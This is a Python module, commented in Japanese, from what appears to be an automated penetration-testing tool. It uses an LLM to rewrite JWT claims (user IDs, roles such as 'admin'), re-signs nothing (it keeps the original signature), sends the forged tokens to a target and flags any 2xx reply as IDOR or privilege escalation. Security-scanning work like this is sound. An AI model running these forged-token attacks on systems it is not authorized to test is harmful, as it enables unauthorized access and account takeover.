"""
AuthSwarm LLM Specialists
LLMを活用して、ルールベースでは検知困難な文脈依存の認証脆弱性（IDOR, 権限昇格など）を検出する。
"""

import logging
import asyncio
import json
import base64
from typing import List, Dict, Any, Optional

from src.core.agents.swarm.base import Specialist, Task
from src.core.models.finding import Finding, VulnType, Severity, Evidence
from src.core.models.llm import LLMClient
from src.tools.builtin.handoff import HandoffContext, HandoffResult, HandoffStatus
import httpx

logger = logging.getLogger(__name__)

class LLMAuthEscalator(Specialist):
    """
    LLMベースの権限昇格・IDOR検知スペシャリスト
    
    JWTやセッショントークンの構造と、ターゲットURLの文脈（/admin/users/123 など）を分析し、
    「もしIDを書き換えたら？」「Roleを変えたら？」といった仮説をLLMに立案させ、検証する。
    """
    name = "LLMAuthEscalator"
    description = "Uses LLM to attempt IDOR and Privilege Escalation attacks based on token context"
    timeout_seconds = 180
    is_aggressive = True  # 攻撃的なリクエストを行うため

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        super().__init__(config)
        cfg = config or {}
        from src.config import settings
        default_model = getattr(settings, "model_output", None) or getattr(settings, "model", "deepseek/deepseek-chat")
        # configがAgentConfigオブジェクトの場合とdictの場合の両方に対応
        if hasattr(cfg, "model"):
             model = cfg.model
        else:
             model = cfg.get("model", default_model)
             
        self.llm = LLMClient(model=model)

    async def execute(self, task: Task) -> List[Finding]:
        """
        認証トークンとターゲットURLを分析し、攻撃を実行
        """
        findings = []
        token = task.params.get("token", "")
        # Original status is optional, default to None or extract from params
        original_status = task.params.get("original_status")

        # Toolとして実行
        result = await self.run_as_tool(task.target, token, original_status)
        
        # 結果をFindingに変換
        for attack in result.get("attacks", []):
            if attack.get("success"):
                findings.append(Finding(
                    vuln_type=VulnType.IDOR, 
                    severity=Severity.HIGH,
                    title=f"Potential Privilege Escalation: {attack['description']}",
                    description=f"LLM successfully bypassed auth check.\nDescription: {attack['description']}\nStrategy: {attack['strategy']}\nEvidence: {attack['evidence']}",
                    target_url=task.target,
                    source_agent=self.name,
                    evidence=Evidence(
                        request_url=task.target,
                        response_body=str(attack.get("evidence", ""))
                    ),
                    is_aggressive=True,
                    tags=["auth_bypass", "llm_detected", "idor"]
                ))
        
        logger.info(f"[{self.name}] Completed: {len(findings)} findings")
        return findings

    async def run_as_tool(self, target_url: str, token: str, original_status: int = None, **kwargs) -> Dict[str, Any]:
        """
        Managerから呼び出し可能なToolメソッド
        """
        result = {
            "target": target_url,
            "attacks": [],
            "logs": []
        }

        # 1. Validation
        if not token or not self._is_jwt(token):
            result["logs"].append("Skipped: No valid JWT token provided")
            return result

        try:
             # 2. Generate Payloads
            payloads = await self._generate_attack_payloads(target_url, token)
            if not payloads:
                result["logs"].append("No attack payloads generated")
                return result
            
            result["logs"].append(f"Generated {len(payloads)} escalation payloads")

            # 3. Execute & Verify
            from src.core.infra.network_client import AsyncNetworkClient
            
            async with AsyncNetworkClient() as client:
                for payload in payloads:
                    is_vuln, evidence = await self._verify_payload(client, target_url, payload, original_status)
                    attack_result = {
                        "description": payload['description'],
                        "strategy": payload['strategy'],
                        "payload_type": payload.get('type', 'modified_claim'),
                        "success": is_vuln,
                        "evidence": evidence
                    }
                    result["attacks"].append(attack_result)
                    
        except Exception as e:
            logger.exception(f"[{self.name}] execution failed: {e}")
            result["error"] = str(e)

        return result

    def _is_jwt(self, token: str) -> bool:
        return token.startswith("ey") and token.count(".") >= 2

    async def _generate_attack_payloads(self, target_url: str, token: str) -> List[Dict[str, Any]]:
        """
        LLMにトークンとURLを見せ、攻撃用トークンを生成させる
        """
        # JWTのPayload部をデコードしてLLMに見せる
        try:
            header, payload, sig = token.split(".")[:3]
            decoded_payload = self._decode_base64(payload)
        except:
            return []

        prompt = f"""
        You are an expert penetration tester focusing on Authentication and Authorization vulnerabilities (IDOR, Privilege Escalation).
        
        Analyze the following JWT payload and Target URL to generate attack scenarios.
        
        Target URL: {target_url}
        Current JWT Payload: {decoded_payload}
        
        Your Goal: Generate modified JWT payloads to attempt privilege escalation or IDOR.
        
        Strategies to consider:
        1. IDOR: If there's a user ID (e.g., "sub", "user_id", "uid"), try changing it to small integers (1, 0) or potentially admin IDs.
        2. Role Manipulation: If there's a role field (e.g., "role", "group", "is_admin"), try changing it to "admin", "administrator", "root", or boolean true.
        3. Parameter Tampering: Modify other sensitive fields visible in the payload.
        
        Return a JSON object with a list of "payloads".
        Each payload object must have:
        - "description": Short description of the attack (e.g., "Change role to admin")
        - "strategy": Why this might work
        - "modified_claims": A dictionary of claims to modify in the original payload.
        
        Example JSON:
        {{
            "payloads": [
                {{
                    "description": "Change role to admin",
                    "strategy": "Privilege Escalation via role manipulation",
                    "modified_claims": {{ "role": "admin" }}
                }}
            ]
        }}
        """

        response = await self.llm.agenerate([{"role": "user", "content": prompt}])
        try:
            # ModelResponseオブジェクトからテキストを取り出す
            if hasattr(response, "choices"):
                content = response.choices[0].message.content
            else:
                content = str(response)

            # Markdownのコードブロック除去など
            json_str = content.replace("```json", "").replace("```", "").strip()
            data = json.loads(json_str)
            
            # 実際に使える攻撃用トークン（署名なし/alg=none対応などは簡易的に）を構築する
            # ※ 本格的には alg=none 署名などを施すべきだが、まずは「中身を変える」ことに注力
            # ここでは「署名は元のまま（受け入れられるか運任せ）」または「None Algorithm」などを試すべきだが、
            # シンプルに「ペイロードを書き換えて再エンコード」し、署名は元のまま（壊れる）or 署名なし等を試行するロジックが必要。
            # 今回は簡易的に「署名なし (alg=none)」と「元の署名 (Broken Signature)」の2パターンを用意して返す等も考えられるが、
            # LLMの出力はあくまで「変更点」なので、ここでトークンを再構築する。
            
            attack_payloads = []
            original_claims = json.loads(decoded_payload)
            
            for item in data.get("payloads", []):
                modified_claims = item.get("modified_claims")
                if not isinstance(modified_claims, dict):
                    logger.warning(f"[{self.name}] Invalid modified_claims format: {modified_claims} (expected dict)")
                    continue

                new_claims = original_claims.copy()
                new_claims.update(modified_claims)
                
                # Payloadを再エンコード
                new_payload_b64 = self._encode_base64(json.dumps(new_claims, separators=(',', ':')))
                
                # Attack 1: Broken Signature (サーバーが署名検証をサボっている場合)
                token_broken = f"{header}.{new_payload_b64}.{sig}"
                item_copy = item.copy() # copy to avoid modifying original iterator item blindly
                item_copy["token"] = token_broken
                item_copy["type"] = "broken_sig"
                attack_payloads.append(item_copy)
                
            return attack_payloads
 
        except Exception as e:
            logger.exception(f"[{self.name}] Failed to generate payloads: {e}")
            return []

    async def _verify_payload(self, client: Any, url: str, payload_info: Dict, original_status: int = None) -> (bool, str):
        """
        生成されたトークンでリクエストを送り、検証する
        """
        token = payload_info["token"]
        headers = {
            "Authorization": f"Bearer {token}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Shigoku/1.0"
        }
        
        try:
            # AsyncNetworkClient.request
            res = await client.request("GET", url, headers=headers)
            
            # 判定ロジック:
            # 1. ステータスコードが200 OK かつ、元が403/401だった場合 -> 成功の可能性大
            # 2. レスポンスサイズやコンテンツの変化（LLMに判定させる手もあるが遅くなるのでまずはヒューリスティック）
            
            # 今回はシンプルに: 「成功(200-299)」かつ「401/403ではない」
            # ※ 元の状態と比較するのがベストだが、簡易実装として「通った」ことを検知する。
            
            if 200 <= res.status_code < 300:
                # 明らかに認可エラーではない。
                # ただし「ログインページにリダイレクトされた」等は200で返ることもあるので注意が必要だが、
                # APIエンドポイントなどを想定。
                
                return True, f"Status: {res.status_code}, Length: {len(res.text)}. Modified payload ({payload_info['description']}) was accepted."
            
            return False, ""
            
        except Exception:
            return False, ""

    def _decode_base64(self, data: str) -> str:
        # パディング補正
        padding = 4 - (len(data) % 4)
        if padding != 4:
            data += "=" * padding
        return base64.urlsafe_b64decode(data).decode('utf-8')

    def _encode_base64(self, data: str) -> str:
        return base64.urlsafe_b64encode(data.encode('utf-8')).decode('utf-8').rstrip('=')
